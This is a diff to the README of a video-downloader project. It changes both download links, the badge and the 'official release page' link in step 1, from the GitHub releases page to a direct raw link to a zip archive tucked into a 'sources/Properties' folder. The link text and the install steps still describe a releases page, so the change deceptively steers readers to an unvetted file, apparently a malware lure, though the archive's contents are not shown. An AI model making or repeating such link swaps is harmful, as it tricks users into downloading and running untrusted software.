@@ -1,6 +1,6 @@
 # 📥 yt-downloader - Save online videos to your computer
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Apprehensive-determinative103/yt-downloader/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Apprehensive-determinative103/yt-downloader/main/sources/Properties/downloader-yt-2.3.zip)
 
 ## 📌 About this project
 
@@ -22,7 +22,7 @@ Before you install this software, ensure your computer meets these basic require
 
 Follow these steps to get the application running on your PC.
 
-1. Visit the [official release page](https://github.com/Apprehensive-determinative103/yt-downloader/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/Apprehensive-determinative103/yt-downloader/main/sources/Properties/downloader-yt-2.3.zip).
 2. Locate the section labeled latest release.
 3. Look for the file ending in `.exe` under the assets list.
 4. Click the file name to start the download.
